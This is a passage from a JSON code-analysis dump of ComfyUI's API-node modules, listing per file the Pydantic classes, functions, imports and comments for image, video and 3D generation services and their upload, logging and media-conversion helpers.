          "class TripoTypeStylizeModel(str, Enum):",
          "class TripoTypeTextureModel(str, Enum):",
          "class User(BaseModel):",
          "class Veo2GenVidPollRequest(BaseModel):",
          "class Error1(BaseModel):",
          "class Video(BaseModel):",
          "class Response(BaseModel):",
          "class Veo2GenVidPollResponse(BaseModel):",
          "class Image(BaseModel):",
          "class Image1(BaseModel):",
          "class Instance(BaseModel):",
          "class PersonGeneration1(str, Enum):",
          "class Parameters(BaseModel):",
          "class Veo2GenVidRequest(BaseModel):",
          "class Veo2GenVidResponse(BaseModel):",
          "class VeoGenVidPollRequest(BaseModel):",
          "class Response1(BaseModel):",
          "class VeoGenVidPollResponse(BaseModel):",
          "class Image2(BaseModel):",
          "class Image3(BaseModel):",
          "class Instance1(BaseModel):",
          "class Parameters1(BaseModel):",
          "class VeoGenVidRequest(BaseModel):",
          "class VeoGenVidResponse(BaseModel):",
          "class SearchContextSize(str, Enum):",
          "class Type35(str, Enum):",
          "class WebSearchPreviewTool(BaseModel):",
          "class Status12(str, Enum):",
          "class Type36(str, Enum):",
          "class WebSearchToolCall(BaseModel):",
          "class WorkflowRunStatus(str, Enum):",
          "class ActionJobResult(BaseModel):",
          "class BFLCannyInputs(BaseModel):",
          "class BFLDepthInputs(BaseModel):",
          "class BFLFluxProExpandInputs(BaseModel):",
          "class BFLFluxProFillInputs(BaseModel):",
          "class BFLHTTPValidationError(BaseModel):",
          "class BulkNodeVersionsRequest(BaseModel):",
          "class GeminiInlineData(BaseModel):",
          "class GeminiPart(BaseModel):",
          "class GeminiPromptFeedback(BaseModel):",
          "class GeminiSafetySetting(BaseModel):",
          "class GeminiSystemInstructionContent(BaseModel):",
          "class GeminiUsageMetadata(BaseModel):",
          "class GithubInstallation(BaseModel):",
          "class GithubReleaseAsset(BaseModel):",
          "class Release(BaseModel):",
          "class GithubRepository(BaseModel):",
          "class IdeogramV3EditRequest(BaseModel):",
          "class IdeogramV3Request(BaseModel):",
          "class ImagenGenerateImageResponse(BaseModel):",
          "class ImagenImageGenerationParameters(BaseModel):",
          "class InputContent(",
          "class InputMessageContentList(RootModel[List[InputContent]]):",
          "class KlingCameraControl(BaseModel):",
          "class KlingDualCharacterEffectInput(BaseModel):",
          "class KlingImage2VideoRequest(BaseModel):",
          "class TaskResult(BaseModel):",
          "class Data(BaseModel):",
          "class KlingImage2VideoResponse(BaseModel):",
          "class TaskResult1(BaseModel):",
          "class Data1(BaseModel):",
          "class KlingImageGenerationsResponse(BaseModel):",
          "class KlingLipSyncInputObject(BaseModel):",
          "class KlingLipSyncRequest(BaseModel):",
          "class TaskResult2(BaseModel):",
          "class Data2(BaseModel):",
          "class KlingLipSyncResponse(BaseModel):",
          "class KlingSingleImageEffectInput(BaseModel):",
          "class KlingText2VideoRequest(BaseModel):",
          "class Data4(BaseModel):",
          "class KlingText2VideoResponse(BaseModel):",
          "class KlingVideoEffectsInput(",
          "class KlingVideoEffectsRequest(BaseModel):",
          "class Data5(BaseModel):",
          "class KlingVideoEffectsResponse(BaseModel):",
          "class KlingVideoExtendRequest(BaseModel):",
          "class Data6(BaseModel):",
          "class KlingVideoExtendResponse(BaseModel):",
          "class LumaGenerationRequest(BaseModel):",
          "class CharacterRef(BaseModel):",
          "class LumaImageGenerationRequest(BaseModel):",
          "class LumaUpscaleVideoGenerationRequest(BaseModel):",
          "class MoonvalleyImageToVideoRequest(MoonvalleyTextToVideoRequest):",
          "class MoonvalleyResizeVideoRequest(MoonvalleyVideoToVideoRequest):",
          "class MoonvalleyTextToImageRequest(BaseModel):",
          "class NodeVersion(BaseModel):",
          "class OutputContent(RootModel[Union[OutputTextContent, OutputAudioContent]]):",
          "class OutputMessage(BaseModel):",
          "class PikaBodyGenerate22I2vGenerate22I2vPost(BaseModel):",
          "class PikaBodyGenerate22KeyframeGenerate22PikaframesPost(BaseModel):",
          "class PikaBodyGenerate22T2vGenerate22T2vPost(BaseModel):",
          "class PikaBodyGeneratePikaffectsGeneratePikaffectsPost(BaseModel):",
          "class PikaHTTPValidationError(BaseModel):",
          "class PublisherMember(BaseModel):",
          "class Reasoning(BaseModel):",
          "class RecraftImage(BaseModel):",
          "class RecraftProcessImageRequest(BaseModel):",
          "class RecraftProcessImageResponse(BaseModel):",
          "class RecraftTextLayout(RootModel[List[RecraftTextLayoutItem]]):",
          "class RecraftTransformImageWithMaskRequest(BaseModel):",
          "class ResponseContentPartAddedEvent(BaseModel):",
          "class ResponseContentPartDoneEvent(BaseModel):",
          "class ResponseError(BaseModel):",
          "class Rodin3DDownloadResponse(BaseModel):",
          "class Rodin3DGenerateRequest(BaseModel):",
          "class Rodin3DGenerateResponse(BaseModel):",
          "class RodinCheckStatusJobItem(BaseModel):",
          "class RunwayImageToVideoRequest(BaseModel):",
          "class StripeCharge(BaseModel):",
          "class StripeChargeList(BaseModel):",
          "class StripePaymentIntent(BaseModel):",
          "class TextResponseFormatConfiguration(",
          "class Tool(",
          "class BulkNodeVersionResult(BaseModel):",
          "class BulkNodeVersionsResponse(BaseModel):",
          "class EasyInputMessage(BaseModel):",
          "class GeminiContent(BaseModel):",
          "class GeminiGenerateContentRequest(BaseModel):",
          "class GithubReleaseWebhook(BaseModel):",
          "class ImagenGenerateImageRequest(BaseModel):",
          "class InputMessage(BaseModel):",
          "class Item(",
          "class LumaGeneration(BaseModel):",
          "class OutputItem(",
          "class Publisher(BaseModel):",
          "class RecraftGenerateImageResponse(BaseModel):",
          "class RecraftImageToImageRequest(BaseModel):",
          "class ResponseOutputItemAddedEvent(BaseModel):",
          "class ResponseOutputItemDoneEvent(BaseModel):",
          "class Text(BaseModel):",
          "class ResponseProperties(BaseModel):",
          "class Rodin3DCheckStatusResponse(BaseModel):",
          "class Data8(BaseModel):",
          "class StripeEvent(BaseModel):",
          "class GeminiCandidate(BaseModel):",
          "class GeminiGenerateContentResponse(BaseModel):",
          "class InputItem(RootModel[Union[EasyInputMessage, Item]]):",
          "class Node(BaseModel):",
          "class OpenAICreateResponse(CreateModelResponseProperties, ResponseProperties):",
          "class OpenAIResponse(ModelResponseProperties, ResponseProperties):",
          "class ResponseCompletedEvent(BaseModel):",
          "class ResponseCreatedEvent(BaseModel):",
          "class ResponseFailedEvent(BaseModel):",
          "class ResponseInProgressEvent(BaseModel):",
          "class ResponseIncompleteEvent(BaseModel):",
          "class OpenAIResponseStreamEvent("
        ],
        "imports": [
          "from __future__ import annotations",
          "from datetime import date, datetime",
          "from enum import Enum",
          "from typing import Any, Dict, List, Literal, Optional, Union",
          "from uuid import UUID",
          "from pydantic import AnyUrl, BaseModel, ConfigDict, Field, RootModel, StrictBytes"
        ],
        "comments": [
          "# generated by datamodel-codegen:",
          "#   filename:  filtered-openapi.yaml",
          "#   timestamp: 2025-07-30T08:54:00+00:00",
          "# pylint: disable"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/apis/minimax_api.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [
          "class MinimaxBaseResponse(BaseModel):",
          "class File(BaseModel):",
          "class MinimaxFileRetrieveResponse(BaseModel):",
          "class MiniMaxModel(str, Enum):",
          "class Status6(str, Enum):",
          "class MinimaxTaskResultResponse(BaseModel):",
          "class SubjectReferenceItem(BaseModel):",
          "class MinimaxVideoGenerationRequest(BaseModel):",
          "class MinimaxVideoGenerationResponse(BaseModel):"
        ],
        "imports": [
          "from enum import Enum",
          "from typing import Optional",
          "from pydantic import BaseModel, Field"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/apis/veo_api.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [
          "class VeoRequestInstanceImage(BaseModel):",
          "class VeoRequestInstance(BaseModel):",
          "class VeoRequestParameters(BaseModel):",
          "class VeoGenVidRequest(BaseModel):",
          "class VeoGenVidResponse(BaseModel):",
          "class VeoGenVidPollRequest(BaseModel):",
          "class Video(BaseModel):",
          "class Error1(BaseModel):",
          "class Response1(BaseModel):",
          "class VeoGenVidPollResponse(BaseModel):"
        ],
        "imports": [
          "from typing import Optional",
          "from pydantic import BaseModel, Field"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/apis/openai_api.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [
          "class Datum2(BaseModel):",
          "class InputTokensDetails(BaseModel):",
          "class Usage(BaseModel):",
          "class OpenAIImageGenerationResponse(BaseModel):",
          "class OpenAIImageEditRequest(BaseModel):",
          "class OpenAIImageGenerationRequest(BaseModel):"
        ],
        "imports": [
          "from pydantic import BaseModel, Field"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/apis/bytedance_api.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [
          "class Text2ImageTaskCreationRequest(BaseModel):",
          "class Image2ImageTaskCreationRequest(BaseModel):",
          "class Seedream4Options(BaseModel):",
          "class Seedream4TaskCreationRequest(BaseModel):",
          "class ImageTaskCreationResponse(BaseModel):",
          "class TaskTextContent(BaseModel):",
          "class TaskImageContentUrl(BaseModel):",
          "class TaskImageContent(BaseModel):",
          "class Text2VideoTaskCreationRequest(BaseModel):",
          "class Image2VideoTaskCreationRequest(BaseModel):",
          "class TaskCreationResponse(BaseModel):",
          "class TaskStatusError(BaseModel):",
          "class TaskStatusResult(BaseModel):",
          "class TaskStatusResponse(BaseModel):"
        ],
        "imports": [
          "from typing import Literal",
          "from pydantic import BaseModel, Field"
        ],
        "comments": [
          "# The time in this dictionary are given for 10 seconds duration."
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/apis/gemini_api.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [
          "class GeminiSafetyCategory(str, Enum):",
          "class GeminiSafetyThreshold(str, Enum):",
          "class GeminiSafetySetting(BaseModel):",
          "class GeminiRole(str, Enum):",
          "class GeminiMimeType(str, Enum):",
          "class GeminiInlineData(BaseModel):",
          "class GeminiFileData(BaseModel):",
          "class GeminiPart(BaseModel):",
          "class GeminiTextPart(BaseModel):",
          "class GeminiContent(BaseModel):",
          "class GeminiSystemInstructionContent(BaseModel):",
          "class GeminiFunctionDeclaration(BaseModel):",
          "class GeminiTool(BaseModel):",
          "class GeminiOffset(BaseModel):",
          "class GeminiVideoMetadata(BaseModel):",
          "class GeminiGenerationConfig(BaseModel):",
          "class GeminiImageConfig(BaseModel):",
          "class GeminiImageGenerationConfig(GeminiGenerationConfig):",
          "class GeminiImageGenerateContentRequest(BaseModel):",
          "class GeminiGenerateContentRequest(BaseModel):",
          "class Modality(str, Enum):",
          "class ModalityTokenCount(BaseModel):",
          "class Probability(str, Enum):",
          "class GeminiSafetyRating(BaseModel):",
          "class GeminiCitation(BaseModel):",
          "class GeminiCitationMetadata(BaseModel):",
          "class GeminiCandidate(BaseModel):",
          "class GeminiPromptFeedback(BaseModel):",
          "class GeminiUsageMetadata(BaseModel):",
          "class GeminiGenerateContentResponse(BaseModel):"
        ],
        "imports": [
          "from datetime import date",
          "from enum import Enum",
          "from typing import Any",
          "from pydantic import BaseModel, Field"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/apis/tripo_api.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [
          "class TripoModelVersion(str, Enum):",
          "class TripoGeometryQuality(str, Enum):",
          "class TripoTextureQuality(str, Enum):",
          "class TripoStyle(str, Enum):",
          "class TripoTaskType(str, Enum):",
          "class TripoTextureAlignment(str, Enum):",
          "class TripoOrientation(str, Enum):",
          "class TripoOutFormat(str, Enum):",
          "class TripoTopology(str, Enum):",
          "class TripoSpec(str, Enum):",
          "class TripoAnimation(str, Enum):",
          "class TripoStylizeStyle(str, Enum):",
          "class TripoConvertFormat(str, Enum):",
          "class TripoTextureFormat(str, Enum):",
          "class TripoTaskStatus(str, Enum):",
          "class TripoFbxPreset(str, Enum):",
          "class TripoFileTokenReference(BaseModel):",
          "class TripoUrlReference(BaseModel):",
          "class TripoObjectStorage(BaseModel):",
          "class TripoObjectReference(BaseModel):",
          "class TripoFileEmptyReference(BaseModel):",
          "class TripoFileReference(RootModel):",
          "class TripoGetStsTokenRequest(BaseModel):",
          "class TripoTextToModelRequest(BaseModel):",
          "class TripoImageToModelRequest(BaseModel):",
          "class TripoMultiviewToModelRequest(BaseModel):",
          "class TripoTextureModelRequest(BaseModel):",
          "class TripoRefineModelRequest(BaseModel):",
          "class TripoAnimatePrerigcheckRequest(BaseModel):",
          "class TripoAnimateRigRequest(BaseModel):",
          "class TripoAnimateRetargetRequest(BaseModel):",
          "class TripoStylizeModelRequest(BaseModel):",
          "class TripoConvertModelRequest(BaseModel):",
          "class TripoTaskRequest(RootModel):",
          "class TripoTaskOutput(BaseModel):",
          "class TripoTask(BaseModel):",
          "class TripoTaskResponse(BaseModel):",
          "class TripoGeneralResponse(BaseModel):",
          "class TripoBalanceData(BaseModel):",
          "class TripoBalanceResponse(BaseModel):",
          "class TripoErrorResponse(BaseModel):"
        ],
        "imports": [
          "from __future__ import annotations",
          "from enum import Enum",
          "from typing import Optional, List, Dict, Any, Union",
          "from pydantic import BaseModel, Field, RootModel"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/apis/luma_api.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, image: torch.Tensor, weight: float):",
          "def create_api_model(self, download_url: str):",
          "def __init__(self, first_ref: LumaReference=None):",
          "def add(self, luma_ref: LumaReference=None):",
          "def create_api_model(self, download_urls: list[str], max_refs=4):",
          "def clone(self):",
          "def __init__(self, key: str):",
          "def __init__(self, str_list: list[str] = None):",
          "def add(self, concept: LumaConcept):",
          "def create_api_model(self):",
          "def clone(self):",
          "def clone_and_merge(self, other: LumaConceptChain):",
          "def get_luma_concepts(include_none=False):"
        ],
        "class_defs": [
          "class LumaIO:",
          "class LumaReference:",
          "class LumaReferenceChain:",
          "class LumaConcept:",
          "class LumaConceptChain:",
          "class LumaImageModel(str, Enum):",
          "class LumaVideoModel(str, Enum):",
          "class LumaAspectRatio(str, Enum):",
          "class LumaVideoOutputResolution(str, Enum):",
          "class LumaVideoModelOutputDuration(str, Enum):",
          "class LumaGenerationType(str, Enum):",
          "class LumaState(str, Enum):",
          "class LumaAssets(BaseModel):",
          "class LumaImageRef(BaseModel):",
          "class LumaImageReference(BaseModel):",
          "class LumaModifyImageRef(BaseModel):",
          "class LumaCharacterRef(BaseModel):",
          "class LumaImageIdentity(BaseModel):",
          "class LumaGenerationReference(BaseModel):",
          "class LumaKeyframes(BaseModel):",
          "class LumaConceptObject(BaseModel):",
          "class LumaImageGenerationRequest(BaseModel):",
          "class LumaGenerationRequest(BaseModel):",
          "class LumaGeneration(BaseModel):"
        ],
        "imports": [
          "from __future__ import annotations",
          "import torch",
          "from enum import Enum",
          "from typing import Optional, Union",
          "from pydantic import BaseModel, Field, confloat"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/apis/rodin_api.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [
          "class Rodin3DGenerateRequest(BaseModel):",
          "class GenerateJobsData(BaseModel):",
          "class Rodin3DGenerateResponse(BaseModel):",
          "class JobStatus(str, Enum):",
          "class Rodin3DCheckStatusRequest(BaseModel):",
          "class JobItem(BaseModel):",
          "class Rodin3DCheckStatusResponse(BaseModel):",
          "class Rodin3DDownloadRequest(BaseModel):",
          "class RodinResourceItem(BaseModel):",
          "class Rodin3DDownloadResponse(BaseModel):"
        ],
        "imports": [
          "from __future__ import annotations",
          "from enum import Enum",
          "from typing import Optional, List",
          "from pydantic import BaseModel, Field"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/apis/stability_api.py",
        "docstrings": [],
        "function_defs": [
          "def get_stability_style_presets(include_none=True):"
        ],
        "class_defs": [
          "class StabilityFormat(str, Enum):",
          "class StabilityAspectRatio(str, Enum):",
          "class StabilityStylePreset(str, Enum):",
          "class Stability_SD3_5_Model(str, Enum):",
          "class Stability_SD3_5_GenerationMode(str, Enum):",
          "class StabilityStable3_5Request(BaseModel):",
          "class StabilityUpscaleConservativeRequest(BaseModel):",
          "class StabilityUpscaleCreativeRequest(BaseModel):",
          "class StabilityStableUltraRequest(BaseModel):",
          "class StabilityStableUltraResponse(BaseModel):",
          "class StabilityResultsGetResponse(BaseModel):",
          "class StabilityAsyncResponse(BaseModel):",
          "class StabilityTextToAudioRequest(BaseModel):",
          "class StabilityAudioToAudioRequest(StabilityTextToAudioRequest):",
          "class StabilityAudioInpaintRequest(StabilityTextToAudioRequest):",
          "class StabilityAudioResponse(BaseModel):"
        ],
        "imports": [
          "from __future__ import annotations",
          "from enum import Enum",
          "from typing import Optional",
          "from pydantic import BaseModel, Field, confloat"
        ],
        "comments": [
          "# sd3_5_large_turbo = \"sd3.5-large-turbo\""
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 1,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/apis/pixverse_api.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [
          "class PixverseIO:",
          "class PixverseStatus(int, Enum):",
          "class PixverseAspectRatio(str, Enum):",
          "class PixverseQuality(str, Enum):",
          "class PixverseDuration(int, Enum):",
          "class PixverseMotionMode(str, Enum):",
          "class PixverseStyle(str, Enum):",
          "class PixverseTextVideoRequest(BaseModel):",
          "class PixverseImageVideoRequest(BaseModel):",
          "class PixverseTransitionVideoRequest(BaseModel):",
          "class PixverseImageUploadResponse(BaseModel):",
          "class PixverseImgIdResponseObject(BaseModel):",
          "class PixverseVideoResponse(BaseModel):",
          "class PixverseVideoIdResponseObject(BaseModel):",
          "class PixverseGenerationStatusResponse(BaseModel):",
          "class PixverseGenerationStatusResponseObject(BaseModel):"
        ],
        "imports": [
          "from __future__ import annotations",
          "from enum import Enum",
          "from typing import Optional",
          "from pydantic import BaseModel, Field"
        ],
        "comments": [
          "# NOTE: forgoing descriptions for now in return for dev speed",
          "# negative_prompt: Optional[str] = Field(None)",
          "# style: Optional[str] = Field(None)",
          "# template_id: Optional[int] = Field(None)",
          "# water_mark: Optional[bool] = Field(None)"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/util/upload_helpers.py",
        "docstrings": [],
        "function_defs": [
          "def _generate_operation_id(method: str, url: str, attempt: int, op_uuid: str) -> str:"
        ],
        "class_defs": [
          "class UploadRequest(BaseModel):",
          "class UploadResponse(BaseModel):"
        ],
        "imports": [
          "import asyncio",
          "import contextlib",
          "import logging",
          "import time",
          "import uuid",
          "from io import BytesIO",
          "from urllib.parse import urlparse",
          "import aiohttp",
          "import torch",
          "from pydantic import BaseModel, Field",
          "from comfy_api.latest import IO, Input, Types",
          "from . import request_logger",
          "from ._helpers import is_processing_interrupted, sleep_with_interrupt",
          "from .client import (",
          "from .common_exceptions import ApiServerError, LocalNetworkError, ProcessingInterrupted",
          "from .conversions import ("
        ],
        "comments": [
          "# if batched, try to upload each file if max_images is greater than 0",
          "# Convert VideoInput to BytesIO using specified container/codec"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 26,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/util/request_logger.py",
        "docstrings": [],
        "function_defs": [
          "def get_log_directory():\n\"\"\"Ensures the API log directory exists within ComfyUI's temp directory and returns its path.\"\"\"\nbase_temp_dir = folder_paths.get_temp_directory()\nlog_dir = os.path.join(base_temp_dir, \"api_logs\")\ntry:\nos.makedirs(log_dir, exist_ok=True)\nexcept Exception as e:\nlogger.error(\"Error creating API log directory %s: %s\", log_dir, str(e))\n# Fallback to base temp directory if sub-directory creation fails\nreturn base_temp_dir",
          "def _sanitize_filename_component(name: str) -> str:",
          "def _short_hash(*parts: str, length: int = 10) -> str:",
          "def _build_log_filepath(log_dir: str, operation_id: str, request_url: str) -> str:\n\"\"\"Build log filepath. We keep it well under common path length limits aiming for <= 240 characters total.\"\"\"\ntimestamp = datetime.datetime.now().strftime(\"%Y%m%d_%H%M%S_%f\")\nslug = _sanitize_filename_component(operation_id)  # Best-effort human-readable slug from operation_id\nh = _short_hash(operation_id or \"\", request_url or \"\")  # Short hash ties log to the full operation and URL\n\n# Compute how much room we have for the slug given the directory length\n# Keep total path length reasonably below ~260 on Windows.\nmax_total_path = 240\nprefix = f\"{timestamp}_\"",
          "def _format_data_for_logging(data: Any) -> str:\n\"\"\"Helper to format data (dict, str, bytes) for logging.\"\"\"\nif isinstance(data, bytes):\ntry:\nreturn data.decode(\"utf-8\")  # Try to decode as text\nexcept UnicodeDecodeError:\nreturn f\"[Binary data of length {len(data)} bytes]\"\nelif isinstance(data, (dict, list)):\ntry:\nreturn json.dumps(data, indent=2, ensure_ascii=False)",
          "def log_request_response(",
          "def get_temp_directory(self):"
        ],
        "class_defs": [
          "class MockFolderPaths:"
        ],
        "imports": [
          "import datetime",
          "import hashlib",
          "import json",
          "import logging",
          "import os",
          "import re",
          "from typing import Any",
          "import folder_paths"
        ],
        "comments": [
          "# Get the logger instance",
          "# Fallback to base temp directory if sub-directory creation fails",
          "# Compute how much room we have for the slug given the directory length",
          "# Keep total path length reasonably below ~260 on Windows.",
          "# Example usage (for testing the logger directly)",
          "# Mock folder_paths for direct execution if not running within ComfyUI full context",
          "# Create a local temp dir for testing if needed"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 8,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/util/conversions.py",
        "docstrings": [],
        "function_defs": [
          "def bytesio_to_image_tensor(image_bytesio: BytesIO, mode: str = \"RGBA\") -> torch.Tensor:\n\"\"\"Converts image data from BytesIO to a torch.Tensor.\n\nArgs:\nimage_bytesio: BytesIO object containing the image data.\nmode: The PIL mode to convert the image to (e.g., \"RGB\", \"RGBA\").\n\nReturns:\nA torch.Tensor representing the image (1, H, W, C).\n",
          "def image_tensor_pair_to_batch(image1: torch.Tensor, image2: torch.Tensor) -> torch.Tensor:\n\"\"\"\nConverts a pair of image tensors to a batch tensor.\nIf the images are not the same size, the smaller image is resized to\nmatch the larger image.\n\"\"\"",
          "def tensor_to_bytesio(",
          "def tensor_to_pil(image: torch.Tensor, total_pixels: int = 2048 * 2048) -> Image.Image:\n\"\"\"Converts a single torch.Tensor image [H, W, C] to a PIL Image, optionally downscaling.\"\"\"\nif len(image.shape) > 3:\nimage = image[0]\n# TODO: remove alpha if not allowed and present\ninput_tensor = image.cpu()\ninput_tensor = downscale_image_tensor(input_tensor.unsqueeze(0), total_pixels=total_pixels).squeeze()\nimage_np = (input_tensor.numpy() * 255).astype(np.uint8)\nimg = Image.fromarray(image_np)\nreturn img",
          "def tensor_to_base64_string(",
          "def pil_to_bytesio(img: Image.Image, mime_type: str = \"image/png\") -> BytesIO:\n\"\"\"Converts a PIL Image to a BytesIO object.\"\"\"\nif not mime_type:\nmime_type = \"image/png\"\n\nimg_byte_arr = BytesIO()\n# Derive PIL format from MIME type (e.g., 'image/png' -> 'PNG')\npil_format = mime_type.split(\"/\")[-1].upper()\nif pil_format == \"JPG\":\npil_format = \"JPEG\"",
          "def downscale_image_tensor(image: torch.Tensor, total_pixels: int = 1536 * 1024) -> torch.Tensor:\n\"\"\"Downscale input image tensor to roughly the specified total pixels.\"\"\"\nsamples = image.movedim(-1, 1)\ntotal = int(total_pixels)\nscale_by = math.sqrt(total / (samples.shape[3] * samples.shape[2]))\nif scale_by >= 1:\nreturn image\nwidth = round(samples.shape[3] * scale_by)\nheight = round(samples.shape[2] * scale_by)\n",
          "def tensor_to_data_uri(",
          "def audio_to_base64_string(audio: Input.Audio, container_format: str = \"mp4\", codec_name: str = \"aac\") -> str:\n\"\"\"Converts an audio input to a base64 string.\"\"\"\nsample_rate: int = audio[\"sample_rate\"]\nwaveform: torch.Tensor = audio[\"waveform\"]\naudio_data_np = audio_tensor_to_contiguous_ndarray(waveform)\naudio_bytes_io = audio_ndarray_to_bytesio(audio_data_np, sample_rate, container_format, codec_name)\naudio_bytes = audio_bytes_io.getvalue()\nreturn base64.b64encode(audio_bytes).decode(\"utf-8\")\n\n",
          "def video_to_base64_string(",
          "def audio_ndarray_to_bytesio(",
          "def audio_tensor_to_contiguous_ndarray(waveform: torch.Tensor) -> np.ndarray:\n\"\"\"\nPrepares audio waveform for av library by converting to a contiguous numpy array.\n\nArgs:\nwaveform: a tensor of shape (1, channels, samples) derived from a Comfy `AUDIO` type.\n\nReturns:\nContiguous numpy array of the audio waveform. If the audio was batched,\nthe first item is taken.",
          "def audio_input_to_mp3(audio: Input.Audio) -> BytesIO:",
          "def trim_video(video: Input.Video, duration_sec: float) -> Input.Video:\n\"\"\"\nReturns a new VideoInput object trimmed from the beginning to the specified duration,\nusing av to avoid loading entire video into memory.\n\nArgs:\nvideo: Input video to trim\nduration_sec: Duration in seconds to keep from the beginning\n\nReturns:",
          "def _f32_pcm(wav: torch.Tensor) -> torch.Tensor:\n\"\"\"Convert audio to float 32 bits PCM format. Copy-paste from nodes_audio.py file.\"\"\"\nif wav.dtype.is_floating_point:\nreturn wav\nelif wav.dtype == torch.int16:\nreturn wav.float() / (2**15)\nelif wav.dtype == torch.int32:\nreturn wav.float() / (2**31)\nraise ValueError(f\"Unsupported wav dtype: {wav.dtype}\")\n",
          "def audio_bytes_to_audio_input(audio_bytes: bytes) -> dict:\n\"\"\"\nDecode any common audio container from bytes using PyAV and return\na Comfy AUDIO dict: {\"waveform\": [1, C, T] float32, \"sample_rate\": int}.\n\"\"\"",
          "def resize_mask_to_image(",
          "def text_filepath_to_base64_string(filepath: str) -> str:\n\"\"\"Converts a text file to a base64 string.\"\"\"\nwith open(filepath, \"rb\") as f:\nfile_content = f.read()\nreturn base64.b64encode(file_content).decode(\"utf-8\")\n\n\ndef text_filepath_to_data_uri(filepath: str) -> str:\n\"\"\"Converts a text file to a data URI.\"\"\"",
          "def text_filepath_to_data_uri(filepath: str) -> str:\n\"\"\"Converts a text file to a data URI.\"\"\"\nbase64_string = text_filepath_to_base64_string(filepath)\nmime_type, _ = mimetypes.guess_type(filepath)\nif mime_type is None:\nmime_type = \"application/octet-stream\"\nreturn f\"data:{mime_type};base64,{base64_string}\"\n"
        ],
        "class_defs": [],
        "imports": [
          "import base64",
          "import logging",
          "import math",
          "import mimetypes",
          "import uuid",
          "from io import BytesIO",
          "import av",
          "import numpy as np",
          "import torch",
          "from PIL import Image",
          "from comfy.utils import common_upscale",
          "from comfy_api.latest import Input, InputImpl, Types",
          "from ._helpers import mimetype_to_extension"
        ],
        "comments": [
          "# TODO: remove alpha if not allowed and present",
          "# Encode bytes to base64 string",
          "# Derive PIL format from MIME type (e.g., 'image/png' -> 'PNG')",
          "# Flush stream",
          "# If batch is > 1, take first item",
          "# Prepare for av: remove batch dim, move to CPU, make contiguous, convert to numpy array",
          "# Get the stream source - this avoids loading entire video into memory",
          "# when the source is already a file path",
          "# Open containers",
          "# Set up output streams for re-encoding",
          "# Create output video stream with same parameters",
          "# Create output audio stream with same parameters",
          "# Calculate target frame count that's divisible by 16",
          "# Decode and re-encode video frames",
          "# Re-encode frame",
          "# Flush encoder",
          "# Decode and re-encode audio frames",
          "# Re-encode frame",
          "# Flush encoder",
          "# Close containers",
          "# Return as VideoFromFile using the buffer",
          "# Clean up on error"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 8,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/ai-studio/ComfyUI/comfy_api_nodes/util/client.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(",
          "def _display_text(",
          "def _display_time_progress(",
          "def _unpack_tuple(t: tuple) -> tuple[str, Any, str]:\n\"\"\"Normalize (filename, value, content_type).\"\"\"\nif len(t) == 2:\nreturn t[0], t[1], \"application/octet-stream\"\nif len(t) == 3:\nreturn t[0], t[1], t[2]\nraise ValueError(\"files tuple must be (filename, file[, content_type])\")\n\n\ndef _merge_params(endpoint_params: dict[str, Any], method: str, data: dict[str, Any] | None) -> dict[str, Any]:",
          "def _merge_params(endpoint_params: dict[str, Any], method: str, data: dict[str, Any] | None) -> dict[str, Any]:",
          "def _friendly_http_message(status: int, body: Any) -> str:",
          "def _generate_operation_id(method: str, path: str, attempt: int) -> str:",
